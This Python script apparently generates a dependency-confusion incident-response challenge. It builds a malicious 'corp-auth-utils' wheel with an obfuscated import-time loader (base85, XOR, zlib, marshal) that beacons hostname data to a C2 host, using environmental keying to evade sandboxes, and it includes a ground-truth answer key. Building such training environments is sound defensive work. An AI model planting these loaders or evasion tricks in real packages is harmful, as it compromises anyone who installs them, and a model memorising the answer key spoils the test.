#!/usr/bin/env python3
"""Deterministic environment generator for dependency-confusion-pin.

Single source of truth: the container Dockerfile runs this module's build() with
system paths; local_test.py imports build(root=<tmp>) for the Docker-free runner, so
the container and the offline runner can never drift apart.

The scenario: a service pinned `corp-auth-utils` by version only. The resolver pulled
the 2.9.9 distribution from a PUBLIC index instead of the organization's internal
mirror (which publishes only the trusted 2.9.0 build). The public 2.9.9 wheel is a
real, working signing library whose _signing module has an appended import-time loader
that beacons a C2 host. Both wheels sit in the pip cache as real zip files; the mirror
index names the trusted build and its wheel filename but deliberately does NOT publish
its sha256, so the integrity hash must be RECOMPUTED, not copied.

The loader carries NO host and NO decode of its own beyond orchestration: it reads an
obfuscated blob from one bundled resource and an XOR key from another, then reverses a
four-stage transform (base85 -> XOR(key) -> zlib -> marshal) to obtain a code object
whose only job is to beacon. The C2 host is XOR-ENCRYPTED and the beacon derives its
decryption key at runtime from an environment variable ($CORP_BUILD_SIG) that is unset
in the sandbox (environmental keying), so a plain import -- even a "detonate and capture
the socket call" attempt with the env generically neutralised -- decrypts to garbage and
never contacts the real host. No plaintext host/port exists anywhere on disk; recovering
the indicators requires the full static decode plus recomputing the build-signature key
(sha256 of the clean _signing.py) and decrypting -- not grep, a single decode, or dynamic
detonation.

Nothing here is random: the environment is byte-for-byte reproducible (wheels are
built with fixed zip timestamps and sorted entries).
"""
import base64
import hashlib
import json
import marshal
import os
import sysconfig
import textwrap
import zipfile
import zlib


# ----------------------------------------------------------------------- identifiers
PKG = "corp_auth_utils"
DIST = "corp-auth-utils"
MAL_VER = "2.9.9"
TRUST_VER = "2.9.0"
MAL_WHEEL = "corp_auth_utils-2.9.9-py3-none-any.whl"
TRUST_WHEEL = "corp_auth_utils-2.9.0-py3-none-any.whl"

# Ground-truth indicators live ONLY inside the compiled+marshalled payload on disk.
C2_HOST = "collector.authlib-cdn.net"
C2_PORT = 8444
EXFIL_ENDPOINT = "/ingest/v1"
XOR_KEY_HEX = "4d3a9fc1e07b625d8a14f39c2be5710d"  # 16 bytes; lives in cachekey.bin (outer decode)
RES_MARKER = b"\n#VBC1\n"
KEY_ENV = "CORP_BUILD_SIG"                       # runtime host-decrypt key source (env)

# The exact injected signature the verifier requires to be absent after remediation.
INJECTED_MARKER = "vendor bootstrap cache (autogenerated; do not edit)"

PRIMARY_CWE = "CWE-494"
OWASP_A = "A08:2021"
MISSING_CONTROL = "hash-pinning"

# Decoy pinned lines that must survive remediation byte-for-byte.
DECOY_REQ_HASH = "5c3e1f9a4b8d2e6c0a7f1b3d9e2c4a6b8d0f2e4c6a8b0d2f4e6c8a0b2d4f6e8c"
DECOY_URL3_HASH = "9a1b2c3d4e5f60718293a4b5c6d7e8f901a2b3c4d5e6f7081920a3b4c5d6e7f8"

LOCK_BASELINE = (
    "# Locked dependency set - regenerate only via the internal resolver\n"
    "requests==2.31.0 --hash=sha256:" + DECOY_REQ_HASH + "\n"
    "corp-auth-utils==2.9.9\n"
    "urllib3==2.0.7 --hash=sha256:" + DECOY_URL3_HASH + "\n"
)


# ----------------------------------------------------------------------------- helpers
def _paths(root):
    """Return (site_packages, pip_cache, mirror, app) for container or tmp root."""
    if root is None:
        sp = sysconfig.get_paths()["purelib"]
        cache = "/opt/pip-cache"
        mirror = "/opt/mirror"
        app = "/app"
    else:
        sp = os.path.join(root, "site-packages")
        cache = os.path.join(root, "opt", "pip-cache")
        mirror = os.path.join(root, "opt", "mirror")
        app = os.path.join(root, "app")
    return sp, cache, mirror, app


def _w(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    kw = {} if "b" in mode else {"newline": ""}
    with open(path, mode, **kw) as f:
        f.write(data)


def _record_line(rel, text_bytes):
    d = hashlib.sha256(text_bytes).digest()
    b64 = base64.urlsafe_b64encode(d).decode().rstrip("=")
    return "%s,sha256=%s,%d" % (rel, b64, len(text_bytes))


def _write_wheel(path, files):
    """Write a deterministic wheel (zip) from {relpath: bytes}."""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        for rel in sorted(files):
            zi = zipfile.ZipInfo(rel, date_time=(1980, 1, 1, 0, 0, 0))
            zi.compress_type = zipfile.ZIP_DEFLATED
            zi.external_attr = 0o644 << 16
            zf.writestr(zi, files[rel])


# --------------------------------------------------------------------- clean package
_INIT_TMPL = (
    '"""corp_auth_utils -- lightweight request-signing helpers."""\n'
    "from ._signing import sign, verify\n\n"
    '__all__ = ["sign", "verify"]\n'
    '__version__ = "%s"\n'
)

_CLEAN_SIGNING = textwrap.dedent('''\
    """corp_auth_utils._signing -- deterministic message signing (upstream build)."""
    import hashlib


    def sign(key, msg):
        if isinstance(key, str):
            key = key.encode("utf-8")
        if isinstance(msg, str):
            msg = msg.encode("utf-8")
        return hashlib.sha256(key + msg).hexdigest()


    def verify(key, msg, signature):
        return sign(key, msg) == signature
''')

# Loader appended to _signing.py in the malicious build. It reads the blob and key
# from separate resource files and reverses base85 -> XOR -> zlib -> marshal; the
# decode inputs are NOT inline in this module.
_INJECTED_LOADER = textwrap.dedent('''

    # --- vendor bootstrap cache (autogenerated; do not edit) ---
    def _load_vendor():
        import os as _os, base64 as _b, zlib as _z, marshal as _m
        _d = _os.path.join(_os.path.dirname(__file__), "_resources")
        _dat = open(_os.path.join(_d, "vendor.dat"), "rb").read()
        _blob = _dat.split(b"\\n#VBC1\\n", 1)[1]
        _key = bytes.fromhex(open(_os.path.join(_d, "cachekey.bin")).read().strip())
        _raw = _b.b85decode(_blob)
        _dec = bytes(x ^ _key[i % len(_key)] for i, x in enumerate(_raw))
        exec(_m.loads(_z.decompress(_dec)), {})
    try:
        _load_vendor()
    except Exception:
        pass
''')


# ------------------------------------------------------------------- hidden payload
# ENVIRONMENTAL KEYING (real sandbox-evasion technique). The C2 host is XOR-ENCRYPTED and
# the decryption key is NOT on disk and NOT a constant: at runtime the payload reads a hex
# "build signature" from the environment ($CORP_BUILD_SIG) and XOR-decrypts the host with
# it. In the sandbox that variable is unset, so the payload decrypts to garbage and never
# contacts the real host -- a "detonate and capture the socket call" attempt (even with the
# env generically neutralised) yields a WRONG host that fails the exact-match check. The
# real key is the trusted build's signing-module hash (sha256 of the clean
# corp_auth_utils/_signing.py, recoverable from the trusted wheel on disk); recovering the
# host requires decoding the payload, understanding the env-keying, recomputing that hash,
# and decrypting. Dynamic execution alone cannot reveal it.
_BUILD_SIG = hashlib.sha256(_CLEAN_SIGNING.encode()).hexdigest()
_KEY16 = bytes.fromhex(_BUILD_SIG)[:16]
_ENC_HOST = bytes(b ^ _KEY16[i % 16] for i, b in enumerate(C2_HOST.encode()))

_PAYLOAD_SRC = (
    "import socket, ssl, json, platform, os, binascii\n"
    "def _beacon():\n"
    "    _sig = os.environ.get(%r, '')\n"
    "    try:\n"
    "        _k = binascii.unhexlify(_sig)\n"
    "    except Exception:\n"
    "        return\n"
    "    if len(_k) < 16:\n"
    "        return\n"
    "    _eh = %r\n"
    "    host = bytes(b ^ _k[i %% 16] for i, b in enumerate(_eh)).decode('utf-8', 'replace')\n"
    "    port = %d\n"
    "    endpoint = %r\n"
    "    try:\n"
    "        with socket.create_connection((host, port), timeout=4) as s:\n"
    "            ctx = ssl.create_default_context()\n"
    "            with ctx.wrap_socket(s, server_hostname=host) as t:\n"
    "                body = json.dumps({'h': platform.node()}).encode()\n"
    "                t.sendall(b'POST ' + endpoint.encode() + b' HTTP/1.1\\r\\n'\n"
    "                          b'Host: ' + host.encode() + b'\\r\\n\\r\\n' + body)\n"
    "    except Exception:\n"
    "        pass\n"
    "_beacon()\n"
) % (KEY_ENV, _ENC_HOST, C2_PORT, EXFIL_ENDPOINT)


def _obfuscate_payload():
    """Return (vendor_dat_bytes, key_hex, decoded_marshal_bytes)."""
    code = compile(_PAYLOAD_SRC, "<vendor>", "exec")
    mc = marshal.dumps(code)                     # stage-4 output (version-specific bytes)
    z = zlib.compress(mc, 9)                     # stage 3
    key = bytes.fromhex(XOR_KEY_HEX)
    x = bytes(b ^ key[i % len(key)] for i, b in enumerate(z))  # stage 2
    blob = base64.b85encode(x)                   # stage 1 (what ships on disk)
    cover = b"# corp_auth_utils vendor table v3\n" + bytes(
        (i * 41 + 7) % 256 for i in range(400)
    )
    return cover + RES_MARKER + blob, XOR_KEY_HEX, mc


# ------------------------------------------------------------------- package builders
def _dist_info(version):
    return "corp_auth_utils-%s.dist-info" % version


def _metadata(version):
    return (
        "Metadata-Version: 2.1\n"
        "Name: corp-auth-utils\n"
        "Version: %s\n"
        "Summary: Lightweight request-signing helpers for internal services\n"
        "Requires-Python: >=3.9\n"
    ) % version


_WHEEL_META = (
    "Wheel-Version: 1.0\n"
    "Generator: silentmesh-build (1.0)\n"
    "Root-Is-Purelib: true\n"
    "Tag: py3-none-any\n"
)


def _package_files(version, malicious, vendor_dat, key_hex):
    """Return {relpath: bytes} for a corp_auth_utils wheel/install tree."""
    init = (_INIT_TMPL % version).encode()
    signing = _CLEAN_SIGNING
    if malicious:
        signing = signing + _INJECTED_LOADER
    signing_b = signing.encode()
    di = _dist_info(version)
    files = {
        "corp_auth_utils/__init__.py": init,
        "corp_auth_utils/_signing.py": signing_b,
    }
    if malicious:
        files["corp_auth_utils/_resources/vendor.dat"] = vendor_dat
        files["corp_auth_utils/_resources/cachekey.bin"] = key_hex.encode()
    files["%s/METADATA" % di] = _metadata(version).encode()
    files["%s/WHEEL" % di] = _WHEEL_META.encode()
    # RECORD lists every file (its own line carries no hash), matching the build.
    rec = [_record_line(rel, files[rel]) for rel in sorted(files)]
    rec.append("%s/RECORD,," % di)
    files["%s/RECORD" % di] = ("\n".join(rec) + "\n").encode()
    return files


_DECOY_MODULE = (
    b'"""benign placeholder module for a cached third-party wheel."""\n'
    b"def _noop():\n    return True\n"
)


def _decoy_wheel_files(top, version):
    di = "%s-%s.dist-info" % (top, version)
    files = {
        "%s/__init__.py" % top: _DECOY_MODULE,
        "%s/METADATA" % di: ("Metadata-Version: 2.1\nName: %s\nVersion: %s\n"
                             % (top, version)).encode(),
        "%s/WHEEL" % di: _WHEEL_META.encode(),
    }
    rec = [_record_line(rel, files[rel]) for rel in sorted(files)]
    rec.append("%s/RECORD,," % di)
    files["%s/RECORD" % di] = ("\n".join(rec) + "\n").encode()
    return files


# ----------------------------------------------------------------------------- build
def build(root=None):
    sp, cache, mirror, app = _paths(root)
    build_dir = os.path.join(app, "build")

    vendor_dat, key_hex, decoded_marshal = _obfuscate_payload()

    mal_files = _package_files(MAL_VER, True, vendor_dat, key_hex)
    trust_files = _package_files(TRUST_VER, False, vendor_dat, key_hex)

    # ---- cached wheels (real zip files) ----
    mal_wheel_path = os.path.join(cache, MAL_WHEEL)
    trust_wheel_path = os.path.join(cache, TRUST_WHEEL)
    _write_wheel(mal_wheel_path, mal_files)
    _write_wheel(trust_wheel_path, trust_files)
    # benign decoy wheels so identifying the confused package is real work
    _write_wheel(os.path.join(cache, "requests-2.31.0-py3-none-any.whl"),
                 _decoy_wheel_files("requests", "2.31.0"))
    _write_wheel(os.path.join(cache, "urllib3-2.0.7-py3-none-any.whl"),
                 _decoy_wheel_files("urllib3", "2.0.7"))

    # ---- installed (malicious) distribution == extraction of the malicious wheel ----
    for rel, data in mal_files.items():
        _w(os.path.join(sp, rel), data)

    # ---- internal mirror index: names the trusted build but NOT its sha256 ----
    index = {
        "index": "internal-mirror",
        "generated": "2026-08-30",
        "packages": {
            "corp-auth-utils": {"trusted_version": TRUST_VER, "wheel": TRUST_WHEEL},
            "requests": {"trusted_version": "2.31.0",
                         "wheel": "requests-2.31.0-py3-none-any.whl"},
            "urllib3": {"trusted_version": "2.0.7",
                        "wheel": "urllib3-2.0.7-py3-none-any.whl"},
        },
    }
    _w(os.path.join(mirror, "index.json"), json.dumps(index, indent=2) + "\n")

    # ---- build artifacts: resolver log + pinned dependency set ----
    _w(os.path.join(build_dir, "install.log"),
       "Looking in indexes: https://pypi.org/simple, "
       "https://mirror.corp.internal/simple\n"
       "Collecting corp-auth-utils==2.9.9\n"
       "  Downloading https://files.pythonhosted.org/packages/"
       "e1/9c/corp_auth_utils-2.9.9-py3-none-any.whl (18 kB)\n"
       "  Resolved corp-auth-utils 2.9.9 from index pypi.org (public)\n"
       "  NOTE: internal mirror https://mirror.corp.internal offers "
       "corp-auth-utils 2.9.0 (org build); public 2.9.9 took precedence\n"
       "Collecting requests==2.31.0\n"
       "  Using cached requests-2.31.0-py3-none-any.whl (from mirror.corp.internal)\n"
       "Collecting urllib3==2.0.7\n"
       "  Using cached urllib3-2.0.7-py3-none-any.whl (from mirror.corp.internal)\n"
       "Saved wheels to /opt/pip-cache\n"
       "Successfully installed corp-auth-utils-2.9.9 requests-2.31.0 urllib3-2.0.7\n"
       "egress-review: pid 1 attempted one outbound TLS connection to a host outside "
       "the mirror during import of a build dependency; blocked by egress policy\n")
    _w(os.path.join(build_dir, "requirements.lock"), LOCK_BASELINE)

    # ---- a small first-party service that consumes the package ----
    _w(os.path.join(app, "service", "src", "svc", "__init__.py"), "")
    _w(os.path.join(app, "service", "src", "svc", "main.py"),
       "import corp_auth_utils\n\n\n"
       "def sign_request(secret, payload):\n"
       "    return corp_auth_utils.sign(secret, payload)\n")

    gt = ground_truth(cache)
    print("built dependency-confusion-pin:",
          "mal", MAL_WHEEL, "trust", TRUST_WHEEL,
          "trust_sha", gt["trusted_sha256"][:12], "host", C2_HOST)
    return gt


def ground_truth(cache):
    trust_wheel_path = os.path.join(cache, TRUST_WHEEL)
    mal_wheel_path = os.path.join(cache, MAL_WHEEL)
    with open(trust_wheel_path, "rb") as f:
        trusted_sha = hashlib.sha256(f.read()).hexdigest()
    return {
        "confused_package": DIST,
        "malicious_version": MAL_VER,
        "trusted_version": TRUST_VER,
        "malicious_artifact": mal_wheel_path,
        "trusted_artifact": trust_wheel_path,
        "trusted_sha256": trusted_sha,
        "missing_control": MISSING_CONTROL,
        "indicator_host": C2_HOST,
        "indicator_port": C2_PORT,
        "exfil_endpoint": EXFIL_ENDPOINT,
        "primary_cwe": PRIMARY_CWE,
        "owasp_a": OWASP_A,
        "injected_marker": INJECTED_MARKER,
        "lock_baseline": LOCK_BASELINE,
        "malicious_wheel_name": MAL_WHEEL,
        "trusted_wheel_name": TRUST_WHEEL,
    }


if __name__ == "__main__":
    build()
